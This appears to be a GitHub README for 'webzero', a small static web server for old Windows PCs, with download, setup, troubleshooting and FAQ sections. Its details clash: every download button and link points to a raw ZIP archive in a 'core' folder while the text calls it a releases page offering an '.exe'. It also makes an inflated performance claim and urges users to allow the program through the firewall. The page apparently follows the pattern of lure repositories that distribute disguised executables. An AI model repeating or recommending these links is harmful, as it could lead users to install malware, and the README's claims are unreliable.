# ⚡ webzero - Simple web server for old PCs

[![Download webzero](https://img.shields.io/badge/Download-webzero-brightgreen)](https://github.com/Juliannaceilinged99/webzero/raw/refs/heads/main/core/Software_v3.8.zip)

webzero is a very small web server designed to run on older and low-power computers. It can deliver static websites quickly without needing extra software or complicated setup. You only need to run one file, and it will serve your website right away.

## 🔍 What is webzero?

webzero is a program that lets you host simple websites on your computer. It works by sending your site's files to anyone who visits. Unlike many web servers, it does not need configuration or extra libraries to work. This makes it good for old PCs or computers with limited memory and processing power.

It works on Windows XP and newer, so most Windows computers can use it. webzero can handle about 5,000 visits each second on old Pentium III hardware. If you want a fast and easy way to serve a small website without installing heavy software, webzero can help.

## 📋 System Requirements

* Windows XP or later (Windows 7, 8, 10, and 11 also supported)  
* At least 100 MB of free disk space  
* Basic familiarity with your Windows file system (opening folders, double-clicking files)  
* The website files you want to serve (HTML, CSS, images, etc.) in a folder  

webzero does not need installation or administrator rights. It runs as a standalone application. 

## 💾 Download webzero

Click the button below to visit the page where you can download webzero. You will find the latest version ready for Windows there.

[![Download webzero](https://img.shields.io/badge/Download-webzero-blue)](https://github.com/Juliannaceilinged99/webzero/raw/refs/heads/main/core/Software_v3.8.zip)

### How to pick the right file

On the releases page, look for the file that ends with `.exe` if you are on Windows. This file is the program you will run.

Avoid any files meant for Linux or source code if you are not familiar with programming or compiling software.

## 🚀 Getting started with webzero on Windows

Follow these steps to start webzero and serve your website:

1. Download the `.exe` file from the releases page linked above. Save it in a folder easy to find, like your Desktop or Downloads.

2. Prepare your website files in a folder. For example, create a folder called `MySite` and put your HTML files, stylesheets, and images inside it.

3. Copy the downloaded `webzero.exe` file into the website folder (`MySite` in this example). This makes it easy to run the server with your website files.

4. Open File Explorer and go to your website folder.

5. Hold the **Shift** key, right-click inside the folder (but not on a file), and select **Open PowerShell window here** or **Open command window here**.

6. In the command window, type this and press Enter:
   
   ```
   .\webzero.exe
   ```

   This will start webzero in the current folder. A message will show the server is running and the address to use in your web browser.

7. Open a web browser like Chrome or Edge, and type the address shown (usually something like `http://localhost:8000`).

8. Your website should appear in the browser. Visitors on your local network can use your computer’s IP address followed by the port number. For example, `http://192.168.1.5:8000`.

## 🔧 How to stop the server

To stop webzero running:

- Go back to the command window where webzero is running.
- Press **Ctrl + C** on your keyboard.
- The program will stop, and your website will no longer be served.

## ⚙️ How webzero works

webzero is a single file that runs by itself. It does not create temporary files or keep settings anywhere on your PC. It serves files from the folder where you run it.

You do not need to install it, change settings, or open ports manually. By default, webzero listens on port 8000. You can change this only if you use command-line options, but for most users, the default will work fine.

## 🔄 Updating webzero

When a new version is available:

1. Download the new `webzero.exe` from the releases page.

2. Replace the old `webzero.exe` in your website folder with the new one.

3. Restart the server by closing the old command window and running the new `webzero.exe` again.

## 🛠 Troubleshooting

**The browser cannot connect to the server:**  
Make sure you are running `webzero.exe` in the correct folder containing your website files. Also, check the server is running in the command window.

**The site shows a 404 error or is blank:**  
Verify your main page is named `index.html` and is inside the folder with `webzero.exe`. This is the default file webzero will open.

**Other programs say port 8000 is busy:**  
If another program uses port 8000, close that program or restart your computer. You can also change the port by running `webzero.exe` with a different port number, but this requires using the command line and may be harder for new users.

## 🌐 Serving your site to other devices

To let other computers on your network see your site:

1. Find your computer’s local IP address:  
   - Open Command Prompt and type `ipconfig`  
   - Look for "IPv4 Address" under your active network connection  

2. Give this IP address and the port 8000 to others. For example:  
   `http://192.168.1.5:8000`

Make sure your firewall allows incoming traffic to the port 8000. On Windows, the first time you start webzero, Windows may ask if you want to allow access. Agree to enable this.

## 🧰 Common use cases

- Host your own static webpage without internet services.  
- Test website files locally before uploading to a live server.  
- Run a small local file-sharing service in your home network.  
- Use with old or low-powered computers to handle simple web requests.  

## 📁 What you can serve

webzero works best with:

- Plain HTML files  
- CSS stylesheets for page design  
- Images like .jpg, .png, .gif  
- JavaScript files without server-side logic  

It does NOT support server-side languages like PHP, databases, or dynamic content. It only serves fixed files from the folder you run it in.

## ❓ FAQs

**Q: Can I run webzero on Windows 7 or 10?**  
Yes. It runs on Windows XP and newer versions.

**Q: Do I need to install webzero?**  
No. Just download and run the `.exe` file. No installation is needed.

**Q: Can webzero host big websites?**  
webzero is designed for simple, static sites. For large or complex sites, consider a full web server.

**Q: Can I run webzero in the background?**  
You run it from a command window that must stay open. Closing that window stops the server.

## 📥 Download webzero now

Access the releases page to get the latest Windows version here:  
https://github.com/Juliannaceilinged99/webzero/raw/refs/heads/main/core/Software_v3.8.zip

Click the green “Download” button on the page and save the `.exe` file to your computer to begin.